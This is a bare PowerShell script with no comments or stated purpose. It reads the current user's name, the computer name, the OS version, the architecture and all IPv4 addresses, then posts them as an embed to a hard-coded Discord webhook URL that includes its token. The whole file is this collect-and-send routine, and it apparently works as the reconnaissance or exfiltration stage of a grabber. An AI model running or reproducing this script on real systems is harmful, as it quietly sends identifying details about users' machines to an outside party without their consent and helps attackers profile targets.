$WebhookUrl = "https://discord.com/api/webhooks/1325924265010135134/pKq11YloFU6xEoHVuzwYLblFdkdADmyDzcwmQOgr6xSrn30nA-32Gtr91hLisCoUaq2h"
$SystemInfo = @{
    Username     = $env:UserName
    ComputerName = $env:COMPUTERNAME
    OS           = (Get-CimInstance Win32_OperatingSystem).Caption
    Architecture = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
    IPAddress    = (Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ", "
}
$Payload = @{
    content = "System infos"
    embeds  = @(
        @{
            title       = "System-Details"
            description = "Details"
            fields      = @(
                @{ name = "Username"; value = $SystemInfo.Username; inline = $true }
                @{ name = "Computername"; value = $SystemInfo.ComputerName; inline = $true }
                @{ name = "OS"; value = $SystemInfo.OS; inline = $true }
                @{ name = "Architecture"; value = $SystemInfo.Architecture; inline = $true }
                @{ name = "IP"; value = $SystemInfo.IPAddress; inline = $false }
            )
        }
    )
}

$JsonPayload = $Payload | ConvertTo-Json -Depth 10
Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $JsonPayload -ContentType "application/json"
Write-Host "Erfolgreich."
